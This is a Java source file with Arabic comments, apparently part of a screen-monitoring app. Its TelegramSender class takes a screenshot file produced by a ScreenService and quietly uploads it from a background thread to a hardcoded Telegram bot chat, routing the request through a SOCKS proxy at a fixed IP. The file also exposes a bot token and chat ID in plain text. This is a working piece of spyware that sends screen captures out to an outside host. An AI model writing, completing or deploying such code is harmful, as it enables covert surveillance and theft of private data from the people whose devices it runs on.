package com.tom5.monitor;

import okhttp3.*;
import java.io.File;
import java.net.InetSocketAddress;
import java.net.Proxy; // التأكد من استيراد البروكسي

public class TelegramSender {
    // تأكد إن اسم الدالة sendPhoto حتى يطابق الاستدعاء في ScreenService
    public static void sendPhoto(File file) {
        String token = "8254504974:AAEK4l6tyoFPOOaPN73A10Txf5Yq9Z5PlzY"; // توكن بوتك
        String chatId = "7259620384"; // ايديك

        new Thread(() -> {
            try {
                // التصحيح: Java تستخدم SOCKS كاسم للنوع في Enum
                Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("64.225.8.135", 1080));

                OkHttpClient client = new OkHttpClient.Builder()
                        .proxy(proxy)
                        .build();

                RequestBody body = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("chat_id", chatId)
                        .addFormDataPart("photo", "screen.png", RequestBody.create(MediaType.parse("image/png"), file))
                        .build();

                Request request = new Request.Builder()
                        .url("https://api.telegram.org/bot" + token + "/sendPhoto")
                        .post(body)
                        .build();

                client.newCall(request).execute();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
